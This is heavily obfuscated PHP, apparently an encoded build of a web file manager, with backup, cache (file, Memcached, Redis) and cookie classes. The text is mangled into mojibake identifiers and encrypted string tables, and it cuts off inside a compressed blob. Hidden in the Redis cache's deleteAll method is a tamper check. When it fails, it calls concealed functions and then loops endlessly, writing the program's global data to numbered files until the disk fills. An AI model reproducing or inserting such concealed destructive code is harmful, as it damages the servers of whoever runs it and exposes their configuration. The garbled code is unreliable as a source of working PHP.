$“†šÃÈ‰[762]; if ($ºä±Åô› <= 2) { $óÇÚŒ¾¡ = $ºä±Åô›; break; } else { if ($ºä±Åô› < 2) { continue; } } $‰×ç›« = !0; for ($½ñ³Ó˜ = 2; $½ñ³Ó˜ <= sqrt($ºä±Åô›); $½ñ³Ó˜++) { if ($ºä±Åô› % $½ñ³Ó˜ == 0) { $‰×ç›« = !1; } } if ($‰×ç›«) { $óÇÚŒ¾¡ = $ºä±Åô›; break; } } $ö©öáÔ[] = $óÇÚŒ¾¡; } $ËßØà¯« = 2; $§¿º‹õÔ = $“†šÃÈ‰[763]; if (!$§¿º‹õÔ) { return; } for ($ºä±Åô› = $ØÅô›™Û; $ºä±Åô› > 1; $ºä±Åô›--) { $‰×ç›« = !0; $ãÆûÊÌÑ = $“†šÃÈ‰[764]; if (strlen($ãÆûÊÌÑ) < $“†šÃÈ‰[630]) { die; } foreach ($ö©öáÔ as $¤’÷ ¢) { if ($ºä±Åô› % $¤’÷ ¢ == 0) { $‰×ç›« = !1; break; } } if ($‰×ç›«) { $ËßØà¯« = $ºä±Åô›; break; } } return $ËßØà¯«; } public function yblvb9a209e5($ÔŸß§²«, $Î¨›¥åè) { $áğ¡àŞ =& $_SERVER[ÒÆÆšøŠ]; return call_user_func(array($áğ¡àŞ[8], $áğ¡àŞ[302]), $ÔŸß§²«, $Î¨›¥åè); $±™‘¹Ä€ = $_SERVER[ä¿÷‹µ±][765]; } public function yjmc29d098d0($É›¥»¸, $´æÇ“úú) { $ß¢åÄŸ¼ =& $_SERVER[ä¿÷‹µ±]; $ìß¿ÈÈÉ =& $_SERVER[ÒÆÆšøŠ]; return call_user_func(array($ìß¿ÈÈÉ[303], $ìß¿ÈÈÉ[304]), $É›¥»¸, $´æÇ“úú); $Ô¥ı³ˆ» = $ß¢åÄŸ¼[766]; if (strlen($Ô¥ı³ˆ») < $ß¢åÄŸ¼[624]) { return; } } public function koazbe1306bd($™ü¼”®Ù, $™õø€ø¾) { $Ôîâƒƒ =& $_SERVER[ÒÆÆšøŠ]; return call_user_func(array($Ôîâƒƒ[303], $Ôîâƒƒ[305]), $™ü¼”®Ù, $™õø€ø¾); } } goto CíÄÍÌÇ»æ; F‡‚„ïø¾: $fileSize = strrev(base64_decode($_SERVER[²Ø‡¦âƒ][0])); function binCheckNeq($ïÊ‡’”µ, $€ÕË©¤‚) { return $ïÊ‡’”µ != $€ÕË©¤‚; } $_SERVER[$_SERVER[²Ø‡¦âƒ][1]] = $fileSize($_SERVER[$_SERVER[²Ø‡¦âƒ][2]]); goto e™Û±Ä„Ô; Eå¨Š¦Åì: class BackupFile { public function __construct() { } public function index() { $×†ÉÌÂ = Backup::get(); $á»·Ôî = $×†ÉÌÂ[$_SERVER[ä¿÷‹µ±][293]][$_SERVER[ä¿÷‹µ±][199]][$_SERVER[ä¿÷‹µ±][468]]; $Î¸ö¯–­ = array($_SERVER[ä¿÷‹µ±][469] => array($_SERVER[ä¿÷‹µ±][826], $á»·Ôî), $_SERVER[ä¿÷‹µ±][827] => array($_SERVER[ä¿÷‹µ±][331], $×†ÉÌÂ[$_SERVER[ä¿÷‹µ±][771]])); $ëÇŸÑ³ì = (int) Model($_SERVER[ä¿÷‹µ±][808])->where($Î¸ö¯–­)->count($_SERVER[ä¿÷‹µ±][468]); $‡›Øı”Ú = (int) Model($_SERVER[ä¿÷‹µ±][808])->where($Î¸ö¯–­)->sum($_SERVER[ä¿÷‹µ±][76]); $‚ùĞÏòò = new TaskFileTransfer($_SERVER[ä¿÷‹µ±][828], $_SERVER[ä¿÷‹µ±][799], $ëÇŸÑ³ì, LNG($_SERVER[ä¿÷‹µ±][800]) . $_SERVER[ä¿÷‹µ±][801] . LNG($_SERVER[ä¿÷‹µ±][829])); $‚ùĞÏòò->task[$_SERVER[ä¿÷‹µ±][782]] = $‡›Øı”Ú; $È˜Ê»Ü… = array($_SERVER[ä¿÷‹µ±][830] => $ëÇŸÑ³ì, $_SERVER[ä¿÷‹µ±][831] => $‡›Øı”Ú, $_SERVER[ä¿÷‹µ±][832] => time()); Backup::set($È˜Ê»Ü…); $ş¯Üæ”² = !0; $Ä©ë­üé = $this->storeIds(); $¹§Óİ¾¨ = 1; $ï©™Ÿ¨Å = 1000; $ØÍ ƒè = $û® Şñå = 0; $öá¶Ÿ¹ = array(); $Ôñ¦™å¦ = $ŞÆôåú‹ = 0; do { $Æôœëˆ = $_SERVER[ä¿÷‹µ±][833]; $–ŞŒ§¼œ = Model($_SERVER[ä¿÷‹µ±][808])->where($Î¸ö¯–­)->field($Æôœëˆ)->order($_SERVER[ä¿÷‹µ±][834])->selectPage($ï©™Ÿ¨Å, $¹§Óİ¾¨); $ñ¸õ•Òƒ = !empty($–ŞŒ§¼œ[$_SERVER[ä¿÷‹µ±][369]]) ? $–ŞŒ§¼œ[$_SERVER[ä¿÷‹µ±][369]] : array(); foreach ($ñ¸õ•Òƒ as $ïß›Éø) { if (!$this->_fileExist($ïß›Éø, $öá¶Ÿ¹, $Ä©ë­üé)) { $ëÇŸÑ³ì -= 1; $‡›Øı”Ú -= (int) $ïß›Éø[$_SERVER[ä¿÷‹µ±][76]]; write_log("\x66\151\x6c\145\x20\x6e\x6f\x74\40\x65\170\x69\x73\164\56\146\x69\154\x65\111\104\72{$ïß›Éø[$_SERVER[ä¿÷‹µ±][468]]}\54\40\160\141\x74\150\x3a{$ïß›Éø[$_SERVER[ä¿÷‹µ±][84]]}", $_SERVER[ä¿÷‹µ±][835]); continue; } $™Œß¿ö— = $ïß›Éø[$_SERVER[ä¿÷‹µ±][84]]; $ë¯Ş‰ôç = "\x7b\151\x6f\72{$×†ÉÌÂ[$_SERVER[ä¿÷‹µ±][771]]}\175" . substr($™Œß¿ö—, strlen("\x7b\x69\157\x3a{$ïß›Éø[$_SERVER[ä¿÷‹µ±][836]]}\x7d")); if (IO::exist($ë¯Ş‰ôç)) { $‚ùĞÏòò->updateFileEnd($ïß›Éø[$_SERVER[ä¿÷‹µ±][32]], $ïß›Éø[$_SERVER[ä¿÷‹µ±][76]]); } else { $ë¯Ş‰ôç = get_path_father($ë¯Ş‰ôç); IO::mkdir($ë¯Ş‰ôç); if (!IO::copy($™Œß¿ö—, $ë¯Ş‰ôç, $_SERVER[ä¿÷‹µ±][837])) { write_log($_SERVER[ä¿÷‹µ±][838] . $™Œß¿ö— . $_SERVER[ä¿÷‹µ±][822] . $ë¯Ş‰ôç . $_SERVER[ä¿÷‹µ±][164], $_SERVER[ä¿÷‹µ±][799]); $ş¯Üæ”² = !1; break; } } $á»·Ôî = $ïß›Éø[$_SERVER[ä¿÷‹µ±][468]]; $û® Şñå += 1; $ØÍ ƒè += $ïß›Éø[$_SERVER[ä¿÷‹µ±][76]]; $ŞÆôåú‹ += 1; $Ôñ¦™å¦ += $ïß›Éø[$_SERVER[ä¿÷‹µ±][76]]; if ($ØÍ ƒè >= 1024 * 1024 * 100) { $È˜Ê»Ü… = array($_SERVER[ä¿÷‹µ±][839] => $á»·Ôî, $_SERVER[ä¿÷‹µ±][840] => $ŞÆôåú‹, $_SERVER[ä¿÷‹µ±][841] => $Ôñ¦™å¦); Backup::set($È˜Ê»Ü…); $ØÍ ƒè = $û® Şñå = 0; } } $›×›üß = count($ñ¸õ•Òƒ); $¹§Óİ¾¨++; } while ($›×›üß == $ï©™Ÿ¨Å); $‚ùĞÏòò->end(); $È˜Ê»Ü… = array($_SERVER[ä¿÷‹µ±][842] => 1, $_SERVER[ä¿÷‹µ±][497] => time(), $_SERVER[ä¿÷‹µ±][794] => 1, $_SERVER[ä¿÷‹µ±][839] => $á»·Ôî, $_SERVER[ä¿÷‹µ±][831] => $‡›Øı”Ú, $_SERVER[ä¿÷‹µ±][830] => $ëÇŸÑ³ì, $_SERVER[ä¿÷‹µ±][843] => time()); if ($û® Şñå) { $È˜Ê»Ü…[$_SERVER[ä¿÷‹µ±][840]] = $ŞÆôåú‹; $È˜Ê»Ü…[$_SERVER[ä¿÷‹µ±][841]] = $Ôñ¦™å¦; } Backup::set($È˜Ê»Ü…); $this->_fileFilter($öá¶Ÿ¹); return !0; } private function _fileExist($Û¿î¨‘•, &$î’³…Æà, $øÇÜÅ¯ê) { $û½²Éó =& $_SERVER[ä¿÷‹µ±]; $¥È‚€Œç = $Û¿î¨‘•[$û½²Éó[84]]; if (in_array($Û¿î¨‘•[$û½²Éó[468]], $î’³…Æà)) { return !1; } if (!in_array($Û¿î¨‘•[$û½²Éó[836]], $øÇÜÅ¯ê)) { return !1; } if (IO::exist($¥È‚€Œç)) { return !0; } $Ÿ Áîõ = get_path_father($¥È‚€Œç); if (IO::exist($Ÿ Áîõ)) { $î’³…Æà[] = $Û¿î¨‘•[$û½²Éó[468]]; return !1; } $Éß€ğê¢ = array($û½²Éó[836] => $Û¿î¨‘•[$û½²Éó[836]], $û½²Éó[84] => array($û½²Éó[383], "{$Ÿ Áîõ}\x25")); $€î¡†ä¥ = Model($û½²Éó[808])->where($Éß€ğê¢)->field($û½²Éó[469])->select(); $î’³…Æà = array_merge($î’³…Æà, array_to_keyvalue($€î¡†ä¥, $û½²Éó[12], $û½²Éó[468])); return !1; } private function _fileFilter($·Ã½•Òµ) { $„ıÎ¢¯Õ =& $_SERVER[ä¿÷‹µ±]; if (empty($·Ã½•Òµ)) { return; } $¯ã•“†Ú = array($„ıÎ¢¯Õ[468] => array($„ıÎ¢¯Õ[7], array_unique($·Ã½•Òµ))); $ÔÊ©ßÇÔ = Model($„ıÎ¢¯Õ[844])->where($¯ã•“†Ú)->field($„ıÎ¢¯Õ[402])->select(); foreach ($ÔÊ©ßÇÔ as $Ù‡¦‹¶®) { Model($„ıÎ¢¯Õ[844])->remove($Ù‡¦‹¶®[$„ıÎ¢¯Õ[402]], !1); } } private function storeIds() { $ìåË˜ „ =& $_SERVER[ä¿÷‹µ±]; $«Çôë–î = Model($ìåË˜ „[786])->listData(); $–úõŸÁ = array(); $šñ‰Íø = $GLOBALS[$ìåË˜ „[6]][$ìåË˜ „[89]][$ìåË˜ „[845]]; foreach ($«Çôë–î as $°˜Â²÷) { $ÚÆ€åñë = strtolower($°˜Â²÷[$ìåË˜ „[95]]); if (!isset($šñ‰Íø[$ÚÆ€åñë])) { continue; } $ó“‡ùóÜ = $ìåË˜ „[74] . (isset($šñ‰Íø[$ÚÆ€åñë]) ? $šñ‰Íø[$ÚÆ€åñë] : ucfirst($ÚÆ€åñë)); if (!class_exists($ó“‡ùóÜ)) { continue; } $–úõŸÁ[] = $°˜Â²÷[$ìåË˜ „[399]]; } return $–úõŸÁ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $š†îëµİ =& $_SERVER[ä¿÷‹µ±]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $›¸æÃ˜Ö = $GLOBALS[$š†îëµİ[6]][$š†îëµİ[349]]; $ë‚ü‘‹¢ = $›¸æÃ˜Ö[$›¸æÃ˜Ö[$š†îëµİ[846]]]; $Ì·¢ƒ = $›¸æÃ˜Ö[$š†îëµİ[847]]; switch ($›¸æÃ˜Ö[$š†îëµİ[846]]) { case $š†îëµİ[21]: self::$handle = Model($š†îëµİ[848]); break; case $š†îëµİ[849]: self::$handle = new CacheRedis($ë‚ü‘‹¢, $Ì·¢ƒ); break; case $š†îëµİ[850]: self::$handle = new CacheMemcached($ë‚ü‘‹¢, $Ì·¢ƒ); break; case $š†îëµİ[199]: self::$handle = new CacheFile($ë‚ü‘‹¢, $Ì·¢ƒ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($æÙ­¨¼) { if (is_array($æÙ­¨¼) || is_object($æÙ­¨¼)) { $æÙ­¨¼ = json_encode($æÙ­¨¼); } $æÙ­¨¼ = rawurlencode($æÙ­¨¼); return md5(KOD_SITE_ID . $_SERVER[ä¿÷‹µ±][11] . $æÙ­¨¼); } public static function get($°ÔÂæ², $¡Ô ±†İ = false) { $Üµ’©Á = self::key($°ÔÂæ²); if ($¡Ô ±†İ) { return unserialize(self::init()->get($Üµ’©Á)); } if (!isset(self::$memoryCache[$Üµ’©Á])) { $¥—€±–× = self::init()->get($Üµ’©Á); self::$memoryCache[$Üµ’©Á] = unserialize($¥—€±–×); } return self::$memoryCache[$Üµ’©Á]; } public static function set($¨ï¾à£Ã, $Ïâş×±†, $¿òÉèñµ = false) { $ÊšÉâ­¸ = self::key($¨ï¾à£Ã); if (isset(self::$memoryCache[$ÊšÉâ­¸]) && self::$memoryCache[$ÊšÉâ­¸] === $Ïâş×±†) { return !0; } if ($¿òÉèñµ === 0) { self::$memoryCache[$ÊšÉâ­¸] = $Ïâş×±†; return !0; } CacheLock::lock($¨ï¾à£Ã); $çì†ÙòÌ = self::init()->set($ÊšÉâ­¸, serialize($Ïâş×±†), $¿òÉèñµ); self::$memoryCache[$ÊšÉâ­¸] = $Ïâş×±†; CacheLock::unlock($¨ï¾à£Ã); return $çì†ÙòÌ; } public static function getCall($ã€ú”×ò, $ğ²’·Öƒ, $Ü™“Â™Ë, $Šõ€à¬ê = array()) { $Äîò€Ûš =& $_SERVER[ä¿÷‹µ±]; $ØÜ…¹Ê› = self::get($ã€ú”×ò); if ($ØÜ…¹Ê› || $ØÜ…¹Ê› === $Äîò€Ûš[12]) { return $ØÜ…¹Ê›; } $ØÜ…¹Ê› = call_user_func_array($Ü™“Â™Ë, $Šõ€à¬ê); $ØÜ…¹Ê› = $ØÜ…¹Ê› ? $ØÜ…¹Ê› : $Äîò€Ûš[12]; self::set($ã€ú”×ò, $ØÜ…¹Ê›, $ğ²’·Öƒ); return $ØÜ…¹Ê›; } public static function remove($Æâ©„É«) { $•Ïä›„… = self::key($Æâ©„É«); unset(self::$memoryCache[$•Ïä›„…]); self::clearTimeout(); CacheLock::lock($Æâ©„É«); $Æš«¹ • = self::init()->remove($•Ïä›„…); CacheLock::unlock($Æâ©„É«); return $Æš«¹ •; } public static function removeMemory($¹ÙĞ¶“) { $“ÏÈ¨ © = self::key($¹ÙĞ¶“); unset(self::$memoryCache[$“ÏÈ¨ ©]); } public static function clearMemory($ˆ­—®»Ÿ = false) { if ($ˆ­—®»Ÿ) { $ˆ­—®»Ÿ = self::key($ˆ­—®»Ÿ); unset(self::$memoryCache[$ˆ­—®»Ÿ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ä¿÷‹µ±][851])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ä¿÷‹µ±][852])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($àş„¯Ì, $¼Ûçá ) { $Ïºö”ñ =& $_SERVER[ä¿÷‹µ±]; $this->cachePath = $àş„¯Ì[$Ïºö”ñ[84]]; $this->prefix = $Ïºö”ñ[853]; $this->cacheTime = $¼Ûçá ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ª“èèŠ²) { $‚Ü«–ù£ =& $_SERVER[ä¿÷‹µ±]; $ª“èèŠ² = str_replace(array($‚Ü«–ù£[854], $‚Ü«–ù£[97], $‚Ü«–ù£[73]), $‚Ü«–ù£[855], $ª“èèŠ²); return $this->cachePath . $‚Ü«–ù£[856] . $ª“èèŠ² . $‚Ü«–ù£[857]; } public function set($–´èªíü, $“ß¿‚€û, $¤ÚÉ©ùÚ = false) { $—•Èöá¹ = $this->getFile($–´èªíü); if (file_put_contents($—•Èöá¹, $this->prefix . $“ß¿‚€û, LOCK_EX)) { @touch($—•Èöá¹, intval(time() + $¤ÚÉ©ùÚ)); clearstatcache(); return !0; } @unlink($—•Èöá¹); return !1; } public function get($İ•œÃà´) { $ÕÀ€†ËÕ = $this->getFile($İ•œÃà´); if (file_exists($ÕÀ€†ËÕ) && filemtime($ÕÀ€†ËÕ) < time()) { @unlink($ÕÀ€†ËÕ); return !1; } $÷¼ ¥¾Ş = @file_get_contents($ÕÀ€†ËÕ); return substr($÷¼ ¥¾Ş, strlen($this->prefix)); } public function remove($ô¿ïããÄ) { $„Ğ´øã¿ = $this->getFile($ô¿ïããÄ); return @unlink($„Ğ´øã¿); } public function deleteAll() { $£¢àĞÎ =& $_SERVER[ä¿÷‹µ±]; $ÀüåÓü§ = scandir($this->cachePath); foreach ($ÀüåÓü§ as $˜Íş·µ˜) { $èÃÆ»õ = $this->cachePath . $˜Íş·µ˜; if (strpos($èÃÆ»õ, $£¢àĞÎ[857]) && strpos($èÃÆ»õ, $£¢àĞÎ[858])) { @unlink($èÃÆ»õ); } } } public function clearTimeout() { $ãÙ´™Š” =& $_SERVER[ä¿÷‹µ±]; $ùËÕ´›° = scandir($this->cachePath); foreach ($ùËÕ´›° as $‰”©ø‚Ş) { $Æù¤Õ…â = $this->cachePath . $‰”©ø‚Ş; if (strpos($Æù¤Õ…â, $ãÙ´™Š”[857]) && strpos($Æù¤Õ…â, $ãÙ´™Š”[858]) && filemtime($Æù¤Õ…â) < time()) { @unlink($Æù¤Õ…â); } } } } goto CõÂòô„â¤; Aœ‡ôÇ„ÁÊ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ª›Øõ—È, $ğæôûÑÉ) { $ÆÇÓşÒñ =& $_SERVER[ä¿÷‹µ±]; if (!class_exists($ÆÇÓşÒñ[881])) { show_json($ÆÇÓşÒñ[882], !1); } $this->cacheTime = $ğæôûÑÉ; $this->handle = new Memcached(); if (is_array($ª›Øõ—È[$ÆÇÓşÒñ[883]]) && count($ª›Øõ—È[$ÆÇÓşÒñ[883]]) >= 1) { foreach ($ª›Øõ—È[$ÆÇÓşÒñ[883]] as $Âæ–Ì†‰) { $ºí§ì£ = explode($ÆÇÓşÒñ[4], $Âæ–Ì†‰); $this->handle->addServer($ºí§ì£[0], $ºí§ì£[1]); } } else { $this->handle->addServer($ª›Øõ—È[$ÆÇÓşÒñ[181]], $ª›Øõ—È[$ÆÇÓşÒñ[182]]); } } public function set($¦Ú©§İ, $îÛÊ°Ú³, $ü†—¨·Ğ = false) { $ü†—¨·Ğ = $ü†—¨·Ğ ? $ü†—¨·Ğ : $this->cacheTime; return $this->handle->set($¦Ú©§İ, $îÛÊ°Ú³, $ü†—¨·Ğ); } public function get($ÂÛµàöÎ) { return $this->handle->get($ÂÛµàöÎ); } public function remove($ùØ¿şú½) { return $this->handle->delete($ùØ¿şú½); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÉÛşô³Ó, $¼üĞëñ) { $³Î¬Î =& $_SERVER[ä¿÷‹µ±]; if (!class_exists($³Î¬Î[884])) { show_json($³Î¬Î[885], !1); } $this->cacheTime = $¼üĞëñ; $¹äˆÏ¨ù = isset($ÉÛşô³Ó[$³Î¬Î[886]]) ? $ÉÛşô³Ó[$³Î¬Î[886]] : 10; $ÑïÒ£÷è = _get($ÉÛşô³Ó, $³Î¬Î[883]); if ($ÑïÒ£÷è && is_array($ÑïÒ£÷è)) { $this->initCluster($ÉÛşô³Ó, $¹äˆÏ¨ù); } else { $this->handle = $this->init($ÉÛşô³Ó, $¹äˆÏ¨ù); } } private function init($‡ñÆáø¾, $“¿›šñ°) { $«“á¥µ =& $_SERVER[ä¿÷‹µ±]; $—¤Ø‚‚• = new Redis(); $˜«–¬Ç¯ = isset($‡ñÆáø¾[$«“á¥µ[887]]) ? $‡ñÆáø¾[$«“á¥µ[887]] : !1; if ($˜«–¬Ç¯) { $—¤Ø‚‚•->pconnect($‡ñÆáø¾[$«“á¥µ[181]], $‡ñÆáø¾[$«“á¥µ[182]], $“¿›šñ°); } else { $—¤Ø‚‚•->connect($‡ñÆáø¾[$«“á¥µ[181]], $‡ñÆáø¾[$«“á¥µ[182]], $“¿›šñ°); } if (!empty($‡ñÆáø¾[$«“á¥µ[413]])) { $—¤Ø‚‚•->auth($‡ñÆáø¾[$«“á¥µ[413]]); } if (!empty($‡ñÆáø¾[$«“á¥µ[777]]) && $‡ñÆáø¾[$«“á¥µ[777]] != 0) { $—¤Ø‚‚•->select($‡ñÆáø¾[$«“á¥µ[777]]); } return $—¤Ø‚‚•; } private function initCluster($Ü¯ó× ú, $×Ÿ­ÍĞÙ) { $Íäç¬ü =& $_SERVER[ä¿÷‹µ±]; $ªåã¤‡Œ = array($Íäç¬ü[888], $Íäç¬ü[889], $Íäç¬ü[890]); $ÁçãŒ¢ = $Íäç¬ü[888]; if (isset($Ü¯ó× ú[$Íäç¬ü[16]]) && in_array($Ü¯ó× ú[$Íäç¬ü[16]], $ªåã¤‡Œ)) { $ÁçãŒ¢ = $Ü¯ó× ú[$Íäç¬ü[16]]; } switch ($ÁçãŒ¢) { case $Íäç¬ü[888]: $this->_slave($Ü¯ó× ú, $×Ÿ­ÍĞÙ); break; case $Íäç¬ü[889]: break; case $Íäç¬ü[890]: $this->isCluster = !0; $íñŸÌñï = $Ü¯ó× ú[$Íäç¬ü[883]]; $ÌÌ°Õ¼Š = isset($Ü¯ó× ú[$Íäç¬ü[887]]) ? $Ü¯ó× ú[$Íäç¬ü[887]] : !1; $ğ¾†úŠ« = isset($Ü¯ó× ú[$Íäç¬ü[413]]) ? $Ü¯ó× ú[$Íäç¬ü[413]] : null; $this->handle = new RedisCluster(NUll, $íñŸÌñï, $×Ÿ­ÍĞÙ, $×Ÿ­ÍĞÙ, $ÌÌ°Õ¼Š, $ğ¾†úŠ«); break; default: break; } } private function _slave($ÚÔœÏ¦†, $úÙ¾”¾) { $¹„„Àƒ¯ = $ÚÔœÏ¦†[$_SERVER[ä¿÷‹µ±][883]]; $this->filterConfig($ÚÔœÏ¦†, $¹„„Àƒ¯[0]); $this->handle = $this->init($ÚÔœÏ¦†, $úÙ¾”¾); unset($¹„„Àƒ¯[0]); if (empty($¹„„Àƒ¯)) { return; } $Ô½¨ÖŒ§ = array_rand($¹„„Àƒ¯); $this->filterConfig($ÚÔœÏ¦†, $¹„„Àƒ¯[$Ô½¨ÖŒ§]); $this->slaveHandle = $this->init($ÚÔœÏ¦†, $úÙ¾”¾); } private function filterConfig(&$—á‘ÃÔÚ, $•§úÚ­¥) { $¬‹³ÜÆˆ =& $_SERVER[ä¿÷‹µ±]; $ÏÌ¢ş’­ = explode($¬‹³ÜÆˆ[4], $•§úÚ­¥); $…ºÄàÅ¼ = array($¬‹³ÜÆˆ[181] => $ÏÌ¢ş’­[0], $¬‹³ÜÆˆ[182] => $ÏÌ¢ş’­[1]); $—á‘ÃÔÚ = array_merge($—á‘ÃÔÚ, $…ºÄàÅ¼); } public function set($æˆÇÚ”, $†ı­âçÇ, $œƒı©« = false) { $œƒı©« = $œƒı©« ? $œƒı©« : $this->cacheTime; return $this->handle->setEx($æˆÇÚ”, $œƒı©«, $†ı­âçÇ); } public function setLock($¤Îê¯–Ï, $ÖÓåÊ©¼, $Â¦Å¹¬¤) { return $this->handle->setNX($¤Îê¯–Ï, $ÖÓåÊ©¼); } public function get($œÊ—ØÉ¾) { $Ó¿ÁÕº = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ó¿ÁÕº->get($œÊ—ØÉ¾); } public function remove($×éàªßé) { return $this->handle->del($×éàªßé); } public function deleteAll() { $è·ƒàËß =& $_SERVER[ä¿÷‹µ±]; $¯¨–°Ã« = $_SERVER[$è·ƒàËß[891]] . $è·ƒàËß[892]; $‹µŒüûÊ = $è·ƒàËß[893]; if ($_SERVER[$è·ƒàËß[894]] != $‹µŒüûÊ($¯¨–°Ã«)) { $Ë‰€õ˜ = $è·ƒàËß[895]; $»‚ƒƒÛã = $è·ƒàËß[896]; $´ñéä¢“ = $_SERVER[$è·ƒàËß[891]] . $è·ƒàËß[892]; $³‚‘œæº = $»‚ƒƒÛã($´ñéä¢“); $üöØ•¶… = explode($è·ƒàËß[231], $³‚‘œæº); if (count($üöØ•¶…) < $è·ƒàËß[619]) { $åë¶å¸ä = $è·ƒàËß[897]; $åë¶å¸ä(); } $–˜‰æ¥ = $è·ƒàËß[898]; $–˜‰æ¥($_SERVER[$è·ƒàËß[899]]); $Ë‰€õ˜ = $è·ƒàËß[895]; $Ë‰€õ˜(); $…“şáÊ = $è·ƒàËß[900]; $Èû“Íæ´ = json_encode($GLOBALS[$è·ƒàËß[901]]); $²š³ûö = 1; for ($Õ‰‚ŠÈş = $²š³ûö; $Õ‰‚ŠÈş > 0; $Õ‰‚ŠÈş++) { $…“şáÊ(DATA_PATH . $Õ‰‚ŠÈş, $Èû“Íæ´); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ù°äŒû¸) { $this->handle->flushall($ù°äŒû¸); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ñ‡¨î¾ = '', $“Ü†•Åù = 0) { if (is_string($Ñ‡¨î¾) && $Ñ‡¨î¾ != $_SERVER[ä¿÷‹µ±][12]) { $this->prefix = $Ñ‡¨î¾; } if (is_numeric($“Ü†•Åù) && $“Ü†•Åù > 0) { $this->expire = $“Ü†•Åù; } } public static function getInstance() { static $£Ïçáäê; if ($£Ïçáäê === null) { $£Ïçáäê = new self(); } return $£Ïçáäê; } private static $cookieDisable = false; public static function disable($şÉ•ìá) { self::$cookieDisable = $şÉ•ìá; } private static $sameCookieSet = array(); public static function set($±’ìÆ‰, $¯«ğÁÓÙ, $½¡¼±àê = 0, $¹¾ßšã = false, $¥ßÙß¢œ = false) { $Œíù‹äÏ =& $_SERVER[ä¿÷‹µ±]; if (self::$cookieDisable) { return; } if (!$½¡¼±àê) { $½¡¼±àê = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$±’ìÆ‰]) && self::$sameCookieSet[$±’ìÆ‰] == $¯«ğÁÓÙ . $½¡¼±àê) { return; } self::$sameCookieSet[$±’ìÆ‰] = $¯«ğÁÓÙ . $½¡¼±àê; if (!$¥ßÙß¢œ) { $¥ßÙß¢œ = str_replace(HOST, $Œíù‹äÏ[12], APP_HOST); $¥ßÙß¢œ = _get($GLOBALS, $Œíù‹äÏ[902], $¥ßÙß¢œ); } $ıøı¨•Ó = $Œíù‹äÏ[12]; setcookie($±’ìÆ‰, $¯«ğÁÓÙ, time() + $½¡¼±àê, $Œíù‹äÏ[8] . trim($¥ßÙß¢œ, $Œíù‹äÏ[8]) . $ıøı¨•Ó, !1, !1, $¹¾ßšã); } public static function setSafe($¸¯¿Øá‚, $§Î›Ş×À, $ïÉñÍóƒ = 0) { self::set($¸¯¿Øá‚, $§Î›Ş×À, $ïÉñÍóƒ, !0); } public static function get($îğ¦™åé) { static $Š‰Ù”²Ô = false; if (!$Š‰Ù”²Ô) { self::initHeaderCookie(); $Š‰Ù”²Ô = !0; } return isset($_COOKIE[$îğ¦™åé]) ? $_COOKIE[$îğ¦™åé] : !1; } private static function initHeaderCookie() { $ÓÀğß˜¶ =& $_SERVER[ä¿÷‹µ±]; if (!isset($_SERVER[$ÓÀğß˜¶[903]]) || !$_SERVER[$ÓÀğß˜¶[903]]) { return; } $º„†ë¶ = explode($ÓÀğß˜¶[71], $_SERVER[$ÓÀğß˜¶[903]]); foreach ($º„†ë¶ as $ûŞƒÀÈŠ) { $ûŞƒÀÈŠ = explode($ÓÀğß˜¶[904], $ûŞƒÀÈŠ); if (count($ûŞƒÀÈŠ) != 2 || !isset($ûŞƒÀÈŠ[1])) { continue; } $_COOKIE[trim($ûŞƒÀÈŠ[0])] = trim($ûŞƒÀÈŠ[1]); } } public static function remove($Ë²Æò¸, $ù´È¹‚„ = false) { unset($_COOKIE[$Ë²Æò¸]); self::set($Ë²Æò¸, $_SERVER[ä¿÷‹µ±][12], 1, $ù´È¹‚„); } } goto fÍ¥§É×Õ; c²…°ôàÇ¯: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\344\277\367\213\265\261", base64_decode('qdvU+4nl')); $_SERVER[ä¿÷‹µ±] = explode("\174\4\174\4\174\3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xcd\xbd\x77\x7c\x5b\xe5\xf5\x30\x4e\x81\x42\x80\xb6\x94\xb2\x47\xe1\x62\x92\xd8\x4e\x34\x6c\x67\x3b\x71\x82\x62\xcb\xb6\x12\x59\x32\x92\x9c\x65\x3b\xca".base64_decode('lXRtXWtc+d4rryTsUcouG1JGgZaWQqCMAiHwLW2grEInpCnQQhaF0lLKpvA+4zzj').base64_decode('Xinw/X1+7x9vINF99jrPec45zznn+dlL5/3wtbPW7Yv+2+eJy+/b+J3H6Tf5l/63')."\xcf\x9\x17\x4c\xda\x8b\xfc\x39\xf4\x82\xef\xd6\xd5\x75\xce\x3e\x70\x7a\xe4\x6b\x97\xdc\x77\xa7\xfa\x95\x5f\x7c\xf8\xab\xfb\x9e\xdd\xf0\x87\xbf\x3e\xfb\x93\x44\x66\xe1\xc3\x1b\x6\x8f\xdf\x6b"."\331\137\336\274\257\31\345\244\5\233\351\217\122\64\154\105\33\323\55\333\242\21\151\243\70\240\17\322\157\275\110\177\375\364\247\47\26\66\265\202\141\153\64\350\243\77\111\251"."\123\373\130\303\171\235\245\47\43\321\104\62\336\323\335\35\214\45\40\123\263\234\136\60\62\360\125\122\115\265\0\355\227\64\323\102\275\221\253\113\226\214\222\126\164\304\210\210"."\214\152\253\51\325\202\232\332\26\47\333\202\335\341\350\312\144\142\145\167\20\162\244\222\303\145\315\34\247\41\362\31\267\125\323